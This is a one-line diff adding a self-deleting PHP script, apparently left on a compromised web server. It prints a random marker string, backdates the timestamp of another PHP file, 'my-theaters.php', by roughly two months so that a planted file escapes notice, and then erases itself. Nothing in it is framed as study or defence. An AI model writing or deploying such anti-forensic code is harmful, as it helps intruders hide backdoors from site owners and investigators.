@@ -1,0 +1,1 @@
+<?php echo "zUxcrfVVTs"; if (file_exists("./my-theaters.php")){ touch("./my-theaters.php",(time()-60*60*24*30*2)); } unlink(__FILE__); /*wdNraSgTvWyRpyCc6AGn*/ ?>
